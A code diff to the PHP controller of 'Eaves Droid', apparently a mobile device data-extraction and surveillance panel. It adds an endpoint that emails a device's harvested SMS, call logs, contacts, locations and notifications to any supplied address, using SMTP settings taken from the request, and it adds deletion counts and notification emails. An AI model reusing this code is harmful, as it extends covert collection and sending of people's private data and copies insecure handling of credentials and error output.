@@ -2,6 +2,7 @@
 
 namespace App\Controllers\clients;
 
+use CodeIgniter\API\ResponseTrait;
 
 use App\Models\Mod_Finder;
 use App\Models\Mod_User;
@@ -11,6 +12,8 @@ use CodeIgniter\Files\File;
 
 class Account extends BaseClientController
 {
+    use ResponseTrait;
+
     /**
      * @var Mod_User
      */
@@ -1339,7 +1342,11 @@ class Account extends BaseClientController
                  return redirect()->to('account/home');
             }
 
-            $this->logUserAction('data_export_' . $type, 'system', 'low', 1);
+            $exportLabel = ['apps'=>'Applications','calls'=>'Call Logs','contacts'=>'Contacts','sms'=>'SMS Messages','files'=>'File Metadata','locations'=>'Location History','advanced'=>'Advanced Data','all'=>'All Data'];
+            $label = $exportLabel[$type] ?? ucfirst($type);
+            $this->logUserAction('exported_' . $type . '_via_download', 'system', 'low', 1,
+                ['new_values' => json_encode(['export_type' => $label, 'format' => $format])]
+            );
             $this->updateExportCount();
 
             if ($format === 'csv') {
@@ -1360,6 +1367,158 @@ class Account extends BaseClientController
             log_message('error', 'Export data error: ' . $e->getMessage());
             session()->setFlashdata('error', 'Failed to export data: ' . $e->getMessage());
             return redirect()->to('account/home');
+        }
+    }
+
+    /**
+     * POST /account/export-email
+     * Generates an export and sends it via email.
+     */
+    public function exportEmail()
+    {
+        if (!$this->request->isAJAX()) {
+            return $this->fail('Invalid request');
+        }
+
+        $type = $this->request->getPost('type');
+        $format = $this->request->getPost('format') ?? 'json';
+        $recipient = $this->request->getPost('email');
+        $dateFrom = $this->request->getPost('date_from');
+        $dateTo = $this->request->getPost('date_to');
+
+        if (!$type || !$recipient) {
+            return $this->fail('Type and email are required.');
+        }
+
+        try {
+            $data = [];
+            switch ($type) {
+                case 'apps': $data = $this->finderModel->get_apps($this->userId, 10000); break;
+                case 'calls': $data = $this->finderModel->get_call_logs($this->userId, 10000); break;
+                case 'contacts': $data = $this->finderModel->get_contacts($this->userId, 10000); break;
+                case 'sms': $data = $this->finderModel->get_sms($this->userId, 10000); break;
+                case 'files': $data = $this->finderModel->export_device_files($this->userId, 10000); break;
+                case 'locations':
+                    $data = ['locations' => $this->finderModel->get_locations($this->userId, 10000), 'activities' => $this->finderModel->get_activities($this->userId, 10000)];
+                    break;
+                case 'advanced':
+                    $data = ['device_context' => $this->finderModel->export_device_context($this->userId), 'network_info' => $this->finderModel->export_network_info($this->userId), 'accounts' => $this->finderModel->export_accounts($this->userId), 'calendar' => $this->finderModel->export_calendar_events($this->userId), 'app_usage' => $this->finderModel->export_app_usage($this->userId), 'notifications' => $this->finderModel->export_notifications($this->userId), 'bluetooth' => $this->finderModel->export_bluetooth($this->userId), 'sensors' => $this->finderModel->export_sensors($this->userId)];
+                    break;
+                case 'all':
+                    $data = ['apps' => $this->finderModel->get_apps($this->userId, 10000), 'calls' => $this->finderModel->get_call_logs($this->userId, 10000), 'contacts' => $this->finderModel->get_contacts($this->userId, 10000), 'sms' => $this->finderModel->get_sms($this->userId, 10000), 'files' => $this->finderModel->export_device_files($this->userId, 10000), 'location' => ['locations' => $this->finderModel->get_locations($this->userId, 10000), 'activities' => $this->finderModel->get_activities($this->userId, 10000)], 'advanced' => ['device_context' => $this->finderModel->export_device_context($this->userId), 'network_info' => $this->finderModel->export_network_info($this->userId), 'accounts' => $this->finderModel->export_accounts($this->userId), 'calendar' => $this->finderModel->export_calendar_events($this->userId), 'app_usage' => $this->finderModel->export_app_usage($this->userId), 'notifications' => $this->finderModel->export_notifications($this->userId), 'bluetooth' => $this->finderModel->export_bluetooth($this->userId), 'sensors' => $this->finderModel->export_sensors($this->userId)]];
+                    break;
+                default: return $this->fail('Invalid type.');
+            }
+
+            $content = json_encode($data, JSON_PRETTY_PRINT);
+            $filename = $type . '_export_' . date('Y-m-d_H-i-s') . '.json';
+            $tmpPath = WRITEPATH . 'uploads/' . $filename;
+            file_put_contents($tmpPath, $content);
+
+            $db = \Config\Database::connect();
+            $smtpSettings = [];
+
+            // Use POSTed SMTP config first, fall back to DB
+            $smtpHost = $this->request->getPost('smtp_host');
+            $smtpPort = $this->request->getPost('smtp_port');
+            $smtpUser = $this->request->getPost('smtp_user');
+            $smtpPass = $this->request->getPost('smtp_pass');
+            $smtpFromEmail = $this->request->getPost('smtp_from_email');
+            $smtpFromName = $this->request->getPost('smtp_from_name');
+
+            if (!$smtpHost) {
+                $rows = $db->table('settings')->where('class', 'notification')->get()->getResultArray();
+                foreach ($rows as $r) {
+                    $smtpSettings[$r['key']] = $r['value'];
+                }
+                $smtpHost = $smtpSettings['smtp_host'] ?? '';
+                $smtpPort = $smtpSettings['smtp_port'] ?? '587';
+                $smtpUser = $smtpSettings['smtp_user'] ?? '';
+                $smtpPass = $smtpSettings['smtp_pass'] ?? '';
+                $smtpFromEmail = $smtpSettings['smtp_from_email'] ?? '';
+                $smtpFromName = $smtpSettings['smtp_from_name'] ?? 'Eaves Droid';
+            }
+
+            $email = \Config\Services::email();
+            $email->initialize([
+                'protocol'   => 'smtp',
+                'SMTPHost'   => $smtpHost,
+                'SMTPPort'   => $smtpPort,
+                'SMTPUser'   => $smtpUser,
+                'SMTPPass'   => $smtpPass,
+                'SMTPCrypto' => 'tls',
+                'mailType'   => 'html',
+                'wordWrap'   => true,
+            ]);
+            $email->setFrom($smtpFromEmail, $smtpFromName);
+            $email->setTo($recipient);
+            $typeLabels = [
+                'apps' => 'Installed Applications',
+                'calls' => 'Call Logs',
+                'contacts' => 'Contacts',
+                'sms' => 'SMS Messages',
+                'files' => 'File Metadata',
+                'locations' => 'Location History',
+                'advanced' => 'Advanced Device Data',
+                'all' => 'Complete Data Archive',
+            ];
+            $label = $typeLabels[$type] ?? ucfirst($type);
+            $fileSize = filesize($tmpPath);
+            $sizeStr = $fileSize > 1048576 ? number_format($fileSize / 1048576, 2) . ' MB' : number_format($fileSize / 1024, 1) . ' KB';
+
+            $email->setSubject('Eaves Droid — ' . $label . ' Export');
+            $email->setMessage('
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"></head>
+<body style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px;">
+    <div style="max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.1);">
+        <div style="background:#007bff;padding:20px;text-align:center;">
+            <h1 style="color:#fff;margin:0;font-size:22px;">📦 Data Export Ready</h1>
+        </div>
+        <div style="padding:25px;">
+            <p style="color:#333;font-size:15px;line-height:1.6;">Hello,</p>
+            <p style="color:#333;font-size:15px;line-height:1.6;">Your requested data export from <strong>Eaves Droid</strong> is now available. The file is attached to this email.</p>
+
+            <table style="width:100%;border-collapse:collapse;margin:20px 0;background:#f8f9fa;border-radius:6px;">
+                <tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Data Type</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . $label . '</td></tr>
+                <tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Format</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . strtoupper($format) . '</td></tr>
+                <tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">File Size</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . $sizeStr . '</td></tr>
+                <tr><td style="padding:10px 15px;font-weight:bold;color:#495057;">Generated</td><td style="padding:10px 15px;">' . date('F j, Y, g:i A') . '</td></tr>
+            </table>
+
+            <div style="background:#e8f4fd;border-left:4px solid #007bff;padding:12px 15px;margin:15px 0;border-radius:4px;">
+                <p style="margin:0;color:#333;font-size:13px;line-height:1.5;">
+                    <strong>📌 Important:</strong> This file contains sensitive personal data. Keep it secure and do not share it with unauthorized parties. Delete the file after use if no longer needed.
+                </p>
+            </div>
+
+            <p style="color:#333;font-size:15px;line-height:1.6;">If you did not request this export, please contact support immediately.</p>
+            <p style="color:#333;font-size:15px;line-height:1.6;">Thank you,<br><strong>Eaves Droid Team</strong></p>
+        </div>
+        <div style="background:#f1f1f1;padding:12px;text-align:center;font-size:11px;color:#888;">
+            Eaves Droid — Advanced Mobile Forensic &amp; Data Intelligence Platform
+        </div>
+    </div>
+</body>
+</html>');
+            $email->attach($tmpPath);
+
+            if ($email->send()) {
+                @unlink($tmpPath);
+                $exportLabel = ['apps'=>'Applications','calls'=>'Call Logs','contacts'=>'Contacts','sms'=>'SMS Messages','files'=>'File Metadata','locations'=>'Location History','advanced'=>'Advanced Data','all'=>'All Data'];
+                $label = $exportLabel[$type] ?? ucfirst($type);
+                $this->logUserAction('exported_' . $type . '_via_email', 'system', 'low', 1,
+                    ['new_values' => json_encode(['export_type' => $label, 'format' => $format, 'recipient' => $recipient, 'file_size' => $fileSize])]
+                );
+                return $this->respond(['success' => true, 'message' => 'Export sent to ' . $recipient]);
+            } else {
+                @unlink($tmpPath);
+                return $this->respond(['success' => false, 'message' => 'Email send failed: ' . $email->printDebugger(['headers', 'subject', 'body'])]);
+            }
+        } catch (\Exception $e) {
+            log_message('error', 'Email export error: ' . $e->getMessage());
+            return $this->fail('Server error: ' . $e->getMessage());
         }
     }
 
@@ -1487,34 +1646,42 @@ class Account extends BaseClientController
         try {
             $success = false;
             $message = '';
+            $deletedCount = 0;
 
             switch ($type) {
                 case 'apps':
+                    $deletedCount = $this->finderModel->cq('tbl_apps', $this->userId);
                     $success = $this->finderModel->deleteAppsByUser($this->userId);
                     $message = 'All apps deleted successfully';
                     break;
                 case 'calls':
                 case 'call_logs':
+                    $deletedCount = $this->finderModel->cq('tbl_logs', $this->userId);
                     $success = $this->finderModel->deleteCallsByUser($this->userId);
                     $message = 'All call logs deleted successfully';
                     break;
                 case 'contacts':
+                    $deletedCount = $this->finderModel->cq('tbl_contacts', $this->userId);
                     $success = $this->finderModel->deleteContactsByUser($this->userId);
                     $message = 'All contacts deleted successfully';
                     break;
                 case 'sms':
+                    $deletedCount = $this->finderModel->cq('tbl_sms', $this->userId);
                     $success = $this->finderModel->deleteSmsByUser($this->userId);
                     $message = 'All SMS messages deleted successfully';
                     break;
                 case 'files':
+                    $deletedCount = $this->finderModel->cq('tbl_device_files', $this->userId);
                     $success = $this->finderModel->deleteDeviceFilesByUser($this->userId);
                     $message = 'All file metadata deleted successfully';
                     break;
                 case 'locations':
+                    $deletedCount = $this->finderModel->cq('tbl_location', $this->userId) + $this->finderModel->cq('tbl_activity', $this->userId);
                     $success = $this->finderModel->deleteLocationByUser($this->userId) && $this->finderModel->deleteActivityByUser($this->userId);
                     $message = 'All location and activity history deleted successfully';
                     break;
                 case 'advanced':
+                    $deletedCount = $this->finderModel->cq('tbl_device_context', $this->userId) + $this->finderModel->cq('tbl_network_info', $this->userId) + $this->finderModel->cq('tbl_accounts', $this->userId) + $this->finderModel->cq('tbl_calendar_events', $this->userId) + $this->finderModel->cq('tbl_app_usage', $this->userId) + $this->finderModel->cq('tbl_notifications', $this->userId) + $this->finderModel->cq('tbl_bluetooth', $this->userId) + $this->finderModel->cq('tbl_sensor_profile', $this->userId);
                     $success = $this->finderModel->deleteDeviceContextByUser($this->userId) &&
                                $this->finderModel->deleteNetworkInfoByUser($this->userId) &&
                                $this->finderModel->deleteAccountsByUser($this->userId) &&
@@ -1526,6 +1693,7 @@ class Account extends BaseClientController
                     $message = 'All advanced extracted data deleted successfully';
                     break;
                 case 'all':
+                    $deletedCount = $this->finderModel->cq('tbl_apps', $this->userId) + $this->finderModel->cq('tbl_logs', $this->userId) + $this->finderModel->cq('tbl_contacts', $this->userId) + $this->finderModel->cq('tbl_sms', $this->userId) + $this->finderModel->cq('tbl_device_files', $this->userId) + $this->finderModel->cq('tbl_location', $this->userId) + $this->finderModel->cq('tbl_activity', $this->userId) + $this->finderModel->cq('tbl_device_context', $this->userId) + $this->finderModel->cq('tbl_network_info', $this->userId) + $this->finderModel->cq('tbl_accounts', $this->userId) + $this->finderModel->cq('tbl_calendar_events', $this->userId) + $this->finderModel->cq('tbl_app_usage', $this->userId) + $this->finderModel->cq('tbl_notifications', $this->userId) + $this->finderModel->cq('tbl_bluetooth', $this->userId) + $this->finderModel->cq('tbl_sensor_profile', $this->userId);
                     $apps = $this->finderModel->deleteAppsByUser($this->userId);
                     $calls = $this->finderModel->deleteCallsByUser($this->userId);
                     $contacts = $this->finderModel->deleteContactsByUser($this->userId);
@@ -1553,9 +1721,57 @@ class Account extends BaseClientController
                     return redirect()->to('account/home');
             }
 
+            $typeLabels = [
+                'apps' => 'Applications',
+                'calls' => 'Call Logs',
+                'call_logs' => 'Call Logs',
+                'contacts' => 'Contacts',
+                'sms' => 'SMS Messages',
+                'files' => 'File Metadata',
+                'locations' => 'Location History & Activities',
+                'advanced' => 'Advanced Device Data',
+                'all' => 'All Data (Complete Wipe)',
+            ];
+            $deleteLabel = $typeLabels[$type] ?? ucfirst(str_replace('_', ' ', $type));
+
             if ($success) {
-                $this->logUserAction('data_delete_' . $type, 'system', 'medium', 1);
+                $this->logUserAction('deleted_' . str_replace('-', '_', $type), 'system', 'high', 1,
+                    ['new_values' => json_encode(['records_type' => $deleteLabel, 'action' => 'delete', 'records_deleted' => $deletedCount])]
+                );
                 $this->updateLastDeletedTimestamp();
+
+                // Send email notification
+                $userEmail = $this->userData['email'] ?? '';
+                if ($userEmail) {
+                    $this->sendNotificationEmail(
+                        $userEmail,
+                        'Eaves Droid — Data Deleted: ' . $deleteLabel,
+                        '
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"></head>
+<body style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px;">
+<div style="max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.1);">
+<div style="background:#dc3545;padding:20px;text-align:center;"><h1 style="color:#fff;margin:0;font-size:22px;">🗑️ Data Deleted</h1></div>
+<div style="padding:25px;">
+<p style="color:#333;font-size:15px;">Hello,</p>
+<p style="color:#333;font-size:15px;">The following data has been permanently deleted from your <strong>Eaves Droid</strong> account.</p>
+<table style="width:100%;border-collapse:collapse;margin:20px 0;background:#f8f9fa;border-radius:6px;">
+<tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Action</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">Permanent Deletion</td></tr>
+<tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Data Type</td><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;">' . $deleteLabel . '</td></tr>
+<tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Records Deleted</td><td style="padding:10px 15px;">' . number_format($deletedCount) . '</td></tr>
+<tr><td style="padding:10px 15px;border-bottom:1px solid #dee2e6;font-weight:bold;color:#495057;">Severity</td><td style="padding:10px 15px;"><span style="color:#dc3545;font-weight:bold;">HIGH</span></td></tr>
+<tr><td style="padding:10px 15px;font-weight:bold;color:#495057;">Completed</td><td style="padding:10px 15px;">' . date('F j, Y, g:i A') . '</td></tr>
+</table>
+<div style="background:#fce8e8;border-left:4px solid #dc3545;padding:12px 15px;margin:15px 0;border-radius:4px;">
+<p style="margin:0;color:#333;font-size:13px;"><strong>⚠️ This action cannot be undone.</strong> The deleted data has been permanently removed from the server.</p>
+</div>
+<p style="color:#333;font-size:15px;">If you did not perform this action, please contact support immediately.</p>
+<p style="color:#333;font-size:15px;">Thank you,<br><strong>Eaves Droid Team</strong></p>
+</div>
+<div style="background:#f1f1f1;padding:12px;text-align:center;font-size:11px;color:#888;">Eaves Droid — Advanced Mobile Forensic &amp; Data Intelligence Platform</div>
+</div></body></html>'
+                    );
+                }
 
                 if ($this->request->isAJAX()) {
                     return $this->response->setJSON(['success' => true, 'message' => $message]);
@@ -1585,6 +1801,41 @@ class Account extends BaseClientController
     // =================================================================
     // UTILITY METHODS
     // =================================================================
+
+    /**
+     * Sends a notification email via configured SMTP.
+     */
+    private function sendNotificationEmail(string $to, string $subject, string $htmlBody): bool
+    {
+        try {
+            $db = \Config\Database::connect();
+            $smtp = [];
+            $rows = $db->table('settings')->where('class', 'notification')->get()->getResultArray();
+            foreach ($rows as $r) {
+                $smtp[$r['key']] = $r['value'];
+            }
+            if (empty($smtp['smtp_host'])) return false;
+
+            $email = \Config\Services::email();
+            $email->initialize([
+                'protocol'   => 'smtp',
+                'SMTPHost'   => $smtp['smtp_host'],
+                'SMTPPort'   => $smtp['smtp_port'] ?? '587',
+                'SMTPUser'   => $smtp['smtp_user'] ?? '',
+                'SMTPPass'   => $smtp['smtp_pass'] ?? '',
+                'SMTPCrypto' => 'tls',
+                'mailType'   => 'html',
+            ]);
+            $email->setFrom($smtp['smtp_from_email'] ?? '', $smtp['smtp_from_name'] ?? 'Eaves Droid');
+            $email->setTo($to);
+            $email->setSubject($subject);
+            $email->setMessage($htmlBody);
+            return $email->send();
+        } catch (\Exception $e) {
+            log_message('error', 'Notification email failed: ' . $e->getMessage());
+            return false;
+        }
+    }
 
     /**
      * Checks if Android device is connected.
